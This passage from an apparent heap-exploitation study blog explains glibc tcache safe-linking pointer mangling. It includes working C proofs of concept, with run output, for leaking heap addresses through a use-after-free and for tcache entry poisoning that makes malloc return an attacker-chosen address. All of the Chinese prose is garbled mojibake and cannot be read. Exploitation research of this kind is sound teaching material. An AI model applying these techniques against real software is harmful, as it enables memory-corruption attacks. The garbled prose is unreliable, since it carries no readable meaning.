<p><code>e</code>æ˜¯å¤´ä¸ŠæŒ‚ç€çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹, ç”±äºæ¡¶å­å¤´åˆ°ç¬¬ä¸€ä¸ªå †å—çš„æŒ‡é’ˆä¸åŠ å¯†, å› æ­¤å¯ä»¥ç›´æ¥è§£å¼•ç”¨æ‹¿åˆ°å¤´å—</p>
<p>æ¥ä¸‹æ¥è¦æŠŠæ¬¡å—ä½œä¸ºæ–°å¤´å—é“¾æ¥åˆ°æ¡¶å­å¤´ä¸Š</p>
<p>ä½†æ˜¯å¤´å—åˆ°æ¬¡å—çš„æŒ‡é’ˆæ˜¯æœ‰åŠ å¯†çš„, å› æ­¤éœ€è¦å…ˆ<code>REVEAL_PTR(e-&gt;next);</code>è§£å¯† ,ç„¶åæ¡¶å­å¤´<code>ep</code>é‡æ–°æŒ‡å‘æ–°å¤´</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241010195555838.png" alt="image-20241010195555838"></p>
<p><code> *ep = REVEAL_PTR(e-&gt;next);</code>å…·ä½“å¦‚ä½•è§£å¯†å‘¢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"> *ep 	= REVEAL_PTR(e-&gt;next);</span><br><span class="line">    	= PROTECT_PTR (&amp;e-&gt;next, e-&gt;next)</span><br><span class="line">    	= ( (&amp;e-&gt;next) &gt;&gt;<span class="number">12</span> ) ^ (e-&gt;next)</span><br><span class="line">    	= ( this &gt;&gt; <span class="number">12</span> ) ^ ( next )</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯å½“å‰å †å—(æ•°æ®åŒº)åœ°å€å³ç§»<code>12</code>ä½ç„¶åå’Œ<code>next</code>å—(æ•°æ®åŒº)åœ°å€åšå¼‚æˆ–</p>
<h5 id="free-2"><a href="#free-2" class="headerlink" title="free"></a>free</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	=&gt; _int_free</span><br><span class="line">		=&gt; tcache_put</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ _int_free</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">        tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">           trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">           2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">           coincidence before aborting.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache_key)) <span class="comment">// é˜²æ­¢double free</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_entry *tmp;</span><br><span class="line">            <span class="type">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">            LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">            <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">                 tmp;</span><br><span class="line">                 tmp = REVEAL_PTR(tmp-&gt;next), ++cnt) <span class="comment">// nextæŒ‡é’ˆä¸å†ç›´æ¥æŒ‡å‘ä¸‹ä¸€ä¸ªå †å—, æœ‰å¼‚æˆ–åŠ å¯†</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(tmp)))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// tc_idxå¯¹åº”æ¡¶å­ä¸­è¿˜æœ‰å‰©ä½™å †å—</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span><span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">       detect a double free.  */</span></span><br><span class="line">    e-&gt;key = tcache_key;		<span class="comment">//ç»™ä¸€ä¸ªkey</span></span><br><span class="line"></span><br><span class="line">    e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);	<span class="comment">//nextåŠ å¯†</span></span><br><span class="line">    tcache-&gt;entries[tc_idx] = e;		<span class="comment">//å¤´æ’æ³• ,æ³¨æ„è¿™ä¸ªæŒ‡é’ˆæ˜¯æ²¡æœ‰åŠ å¯†çš„</span></span><br><span class="line">    ++(tcache-&gt;counts[tc_idx]);			<span class="comment">//ç»éªŒ+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>next</code>å¦‚ä½•è®¡ç®—çš„å‘¢?</p>
<p>å¯¹äºç¬¬ä¸€ä¸ªå…¥æ¡¶çš„å †å—,æ­¤æ—¶<code>tcache-&gt;entries[tc_idx] = 0</code>,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;e-&gt;next</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> tcache_entry **) <span class="number">0x4052a0</span></span><br><span class="line">pwndbg&gt; p tcache-&gt;entries[tc_idx]</span><br><span class="line">$<span class="number">8</span> = (tcache_entry *) <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; p e-&gt;next</span><br><span class="line">$<span class="number">9</span> = (<span class="keyword">struct</span> tcache_entry *) <span class="number">0x405</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">e-&gt;next = ( 0x4052a0 &gt;&gt; 12 ) ^ 0</span><br><span class="line">		=0x405</span><br></pre></td></tr></table></figure>

<p>å¯¹äºç¬¬äºŒä¸ªå…¥æ¡¶çš„å †å—,æ­¤æ—¶<code>tcache-&gt;entries[tc_idx] = 0x4052a0</code>, æ˜¯æœ€åä¸€ä¸ªè¿›å…¥è¯¥æ¡¶çš„å †å—æŒ‡é’ˆ, è¿™ä¸ªæŒ‡é’ˆæ˜¯æ²¡æœ‰åŠ å¯†çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;e-&gt;next</span><br><span class="line">$<span class="number">11</span> = (<span class="keyword">struct</span> tcache_entry **) <span class="number">0x4052c0</span></span><br><span class="line">pwndbg&gt; p  tcache-&gt;entries[tc_idx]</span><br><span class="line">$<span class="number">12</span> = (tcache_entry *) <span class="number">0x4052a0</span></span><br><span class="line">pwndbg&gt; p e-&gt;next</span><br><span class="line">$<span class="number">13</span> = (<span class="keyword">struct</span> tcache_entry *) <span class="number">0x4056a5</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">e-&gt;next = ( 0x4052c0 &gt;&gt; 12 ) ^ 0x4052a0</span><br><span class="line">		= 0x405 ^ 0x4052a0</span><br><span class="line">		= 0x4056a5</span><br></pre></td></tr></table></figure>

<h4 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h4><h5 id="safe-linking-UAF"><a href="#safe-linking-UAF" class="headerlink" title="[safe-linking] UAF"></a>[safe-linking] UAF</h5><p>å‡è®¾æˆ‘ä»¬æœ‰<code>UAF</code>çš„èƒ½åŠ›,å¦‚æœæƒ³è¦æ³„éœ²ä¸€ä¸ªå †å—çš„åœ°å€,è¿˜éœ€è¦ä»€ä¹ˆä¿¡æ¯?</p>
<blockquote>
<p>â€œæˆ‘ä»¬æœ‰<code>UAF</code>çš„èƒ½åŠ›â€,è¯´çš„æ›´ç›´ç™½ä¸€äº›,å°±æ˜¯åœ¨å †å—é‡Šæ”¾å›åˆ°<code>tcache</code>ä¹‹å,å¯ä»¥æ‰“å°æ³„éœ²å…¶<code>next</code>å­—æ®µçš„å€¼</p>
</blockquote>
<p>å‡è®¾<code>tcache</code>ä¸ºç©º,chunk1,chunk2,chunk3å¤§å°ç›¸åŒ</p>
<p><strong>ç°åœ¨<code>free(chunk1)</code>é‡Šæ”¾å›<code>tcache</code></strong></p>
<p><code>free</code> å‰æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] = 0</span><br></pre></td></tr></table></figure>

<p><code>free</code>åæœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1.next = ( &amp;chunk1.next &gt;&gt; 12 ) ^ 0 =  chunk1_mem &gt;&gt; 12</span><br><span class="line">tcache.entries[idx]	-&gt; chunk1_mem</span><br></pre></td></tr></table></figure>

<p>å³ä½¿æˆ‘ä»¬æœ‰<code>chunk1</code>çš„<code>UAF</code>,ä¹Ÿåªèƒ½çŸ¥é“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1.next = chunk1_mem &gt;&gt; 12</span><br></pre></td></tr></table></figure>

<p>å³ç§»è®¡ç®—ä¸å¯é€†,ä½ä½æ•°æ®å·²ç»ä¸¢å¤±</p>
<p>æˆ‘ä»¬èƒ½åšçš„åªèƒ½æ˜¯åˆ©ç”¨<code>UAF</code>è·å–<code>chunk1.next</code>,ä¹Ÿå°±æ˜¯è·å–<code>chunk1</code>æ‰€åœ¨çš„è™šæ‹Ÿé¡µæ¡†å·</p>
<p><strong>æ¥ç€<code>free(chunk2)</code></strong></p>
<p><code>free</code>å‰æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] = chunk1_mem</span><br></pre></td></tr></table></figure>

<p><code>free</code> åæœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = ( &amp;chunk2.next &gt;&gt; 12 ) ^ (tcache.entries[idx])</span><br><span class="line">			= ( chunk2_mem &gt;&gt; 12 ) ^ (chunk1_mem)</span><br><span class="line">			</span><br><span class="line">tcache.entries[idx] = chunk2_mem		</span><br></pre></td></tr></table></figure>

<p>åˆ<code>chunk1</code>å’Œ<code>chunk2</code>è·ç¦»æ¯”è¾ƒè¿‘,åœ¨åŒä¸€é¡µä¸Š,å› æ­¤ä¸¤è€…çš„è™šæ‹Ÿé¡µæ¡†å·ç›¸åŒ,ä¹Ÿå³</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1_mem &gt;&gt; 12 == chunk2_mem &gt;&gt; 12</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = (chunk1_mem &gt;&gt; 12) ^ (chunk1_mem)</span><br><span class="line">			= (chunk1.next) ^ (chunk1_mem)</span><br></pre></td></tr></table></figure>

<p>åˆå¼‚æˆ–è¿ç®—å¯é€†,å› æ­¤æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1_mem = (chunk2.next) ^ (chunk1.next)</span><br></pre></td></tr></table></figure>



<p><strong>åŒç†,å¦‚æœç»§ç»­<code>free(chunk3)</code></strong></p>
<p>å¯ä»¥å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk2_mem = (chunk3.next) ^ (chunk1.next)</span><br></pre></td></tr></table></figure>

<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> * chunk1;</span><br><span class="line">  <span class="type">size_t</span> * chunk2;  </span><br><span class="line">  <span class="type">size_t</span> * chunk3;</span><br><span class="line">  <span class="type">size_t</span> chunk1_next;</span><br><span class="line">  <span class="type">size_t</span> chunk2_next;</span><br><span class="line">  <span class="type">size_t</span> chunk3_next;</span><br><span class="line"></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk1);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk1]</span></span><br><span class="line">  <span class="built_in">free</span>(chunk2);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk2] ====PROTECTED_PTR====&gt; [chunk1]</span></span><br><span class="line"></span><br><span class="line">  chunk1_next = chunk1[<span class="number">0</span>];</span><br><span class="line">  chunk2_next = chunk2[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1_next ^ chunk2_next = %p\n&quot;</span>,chunk1_next ^ chunk2_next);</span><br><span class="line">  assert(chunk1_next ^ chunk2_next == chunk1);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(chunk3);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk3] ====PROTECTED_PTR====&gt; [chunk2] ====PROTECTED_PTR====&gt; [chunk1]</span></span><br><span class="line">  chunk3_next = chunk3[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1_next ^ chunk3_next = %p\n&quot;</span>,chunk1_next ^ chunk3_next);</span><br><span class="line">  assert(chunk1_next ^ chunk3_next == chunk2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/heap/test<span class="meta"># gcc safe.c -o safe -g -w</span></span><br><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/heap/test# ./safe</span><br><span class="line">chunk1 @ <span class="number">0x55fc111882a0</span></span><br><span class="line">chunk1_next ^ chunk2_next = <span class="number">0x55fc111882a0</span></span><br><span class="line">chunk2 @ <span class="number">0x55fc111882c0</span></span><br><span class="line">chunk1_next ^ chunk3_next = <span class="number">0x55fc111882c0</span></span><br></pre></td></tr></table></figure>





<h5 id="safe-linking-tcache-entry-poisoning"><a href="#safe-linking-tcache-entry-poisoning" class="headerlink" title="[safe-linking] tcache entry poisoning"></a>[safe-linking] tcache entry poisoning</h5><p>å¦‚æœè¿˜æƒ³è±¡å¾€æ—¥ä¸€æ ·,å¾€ä¸€ä¸ªè¢«é‡Šæ”¾è¿›å…¥<code>tcache</code>çš„å †å—ä¸ŠæŒ‚ä¸å¹²å‡€çš„ä¸œè¥¿<code>fake_chunk</code></p>
<p>é¦–å…ˆä¸ºäº†æ»¡è¶³<code>tcache.counts[idx]</code>çš„çº¦æŸ,éœ€è¦å †é‡Œè‡³å°‘æœ‰ä¸¤å—,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 2</span><br><span class="line">tcache.entries[idx] =&gt; chunk2 -&gt; chunk1</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥è€ƒè™‘ä¿®æ”¹<code>chunk2.next</code> æŒ‡å‘<code>fake_chunk</code></p>
<p>ä¿®æ”¹å®Œä¹‹å<code>tcache</code>çš„çŠ¶æ€å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 2</span><br><span class="line">tcache.entries[idx] =&gt; chunk2 -&gt; fake_chunk</span><br></pre></td></tr></table></figure>

<p>è¿™ç§çŠ¶æ€<strong>å¯ä»¥çœ‹ä½œ</strong><code>tcache</code>ä»<strong>ç©º</strong>åˆ°å…ˆ<code>free(fake_chunk)</code>ç„¶å<code>free(chunk2)</code>ä¹‹åçš„çŠ¶æ€,è¯šå¦‚æ˜¯,å¯ä»¥ä»å¤´å¼€å§‹è€ƒè™‘:</p>
<p>åœ¨<code>free(fake_chunk)</code>ä¹‹å,<code>tcache</code>ä¸­çš„çŠ¶æ€å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 1</span><br><span class="line">tcache.entries[idx] =&gt; fake_chunk</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶<code>free(chunk2)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = ( &amp;chunk2.next &gt;&gt; 12 ) ^ (tcache.entries[idx])</span><br><span class="line">			= ( chunk2_mem &gt;&gt; 12 ) ^ (fake_chunk_mem)</span><br></pre></td></tr></table></figure>

<p>åˆ<code>chunk2_mem &gt;&gt; 12</code>å°±æ˜¯<code>chunk2</code>çš„è™šæ‹Ÿé¡µæ¡†å·,å…¶å€¼ç­‰äº<code>chunk1.next</code>,å› æ­¤å¯ä»¥åœ¨<code>fake_chunk</code>ä¸Šé“¾å‰,å…ˆè®¡ç®—å¾—çŸ¥è¯¥å€¼</p>
<p>åˆ<code>fake_chunk_mem</code>æ˜¯æˆ‘ä»¬å·²çŸ¥çš„ç›®æ ‡åœ°å€,</p>
<p>å› æ­¤<code>chunk2.next</code>è®¡ç®—å¯å¾—</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// size_t PROTECTED_PTR (size_t pos,size_t ptr)&#123;</span></span><br><span class="line"><span class="comment">//   return ((pos &gt;&gt; 12) ^ ptr);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">//ç»“æ„ä½“è‡ªåŠ¨å¯¹é½åˆ°sizeof(tcache_entry) = 0x10</span></span><br><span class="line">  <span class="type">size_t</span> * next;</span><br><span class="line">  <span class="type">size_t</span> key;</span><br><span class="line">&#125;tcache_entry;</span><br><span class="line"></span><br><span class="line">tcache_entry fake_chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> * chunk1;</span><br><span class="line">  <span class="type">size_t</span> * chunk2;</span><br><span class="line">  <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">  fake_chunk.next = <span class="number">0xcafebabe</span>;</span><br><span class="line">  fake_chunk.key = <span class="number">0xdeadbeef</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk @ %p\n&quot;</span>,&amp;fake_chunk);</span><br><span class="line"></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk1);</span><br><span class="line">  <span class="built_in">free</span>(chunk2);</span><br><span class="line"></span><br><span class="line">  chunk2[<span class="number">0</span>] = chunk1[<span class="number">0</span>] ^ (<span class="type">size_t</span>)(&amp;fake_chunk);</span><br><span class="line">  </span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  victim = (tcache_entry *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">  assert(victim == &amp;fake_chunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwncollege/software/heap/test# gcc safe_poison.c -o safe_poison -g -w</span><br><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwncollege/software/heap/test# ./safe_poison    </span><br><span class="line">fake_chunk @ 0x55fe8ca46020</span><br><span class="line">victim = 0x55fe8ca46020</span><br></pre></td></tr></table></figure>



<h5 id="safe-linking-metadata-poisoning-memory-leak"><a href="#safe-linking-metadata-poisoning-memory-leak" class="headerlink" title="[safe-linking] metadata poisoning memory leak"></a>[safe-linking] metadata poisoning memory leak</h5><p>ä½¿ç”¨<code>tcache entry poisoning</code>ä¹‹åä¸€ç›´<code>malloc</code>æŠŠå‡å †å—æ‹¿å‡ºæ¥</p>
<p>æ­¤æ—¶<code>fake_chunk.next</code>å€¼ä¼šè¢«â€œè§£å¯†â€ç„¶åæŒ‚è½½<code>tcache.entries[idx]</code></p>
<p>å…·ä½“è¿‡ç¨‹æ˜¯è¿™æ ·çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] =&gt; fake_chunk -&gt; fake_chunk.next</span><br></pre></td></tr></table></figure>

<p>å½“<code>fake_chunk</code>è¦ä»é“¾æ¡ä¸Šæ‹¿èµ°æ—¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep =  &amp;tcache-&gt;entries[tc_idx]	//epå°±æ˜¯æ¡¶å­å¤´</span><br><span class="line">e = *ep				//e å°±æ˜¯fake_chunk</span><br><span class="line">*ep = REVEAL_PTR(e-&gt;next);		//æ–°epæŒ‡å‘</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache-&gt;entries[tc_idx] = REVEAL_PTR(fake_chunk-&gt;next)</span><br><span class="line">						= ( fake_chunk_addr &gt;&gt; 12 ) ^ fake_chunk.next</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æƒ³è¦æ³„éœ²çš„æ˜¯<code>fake_chunk.next</code>,</p>
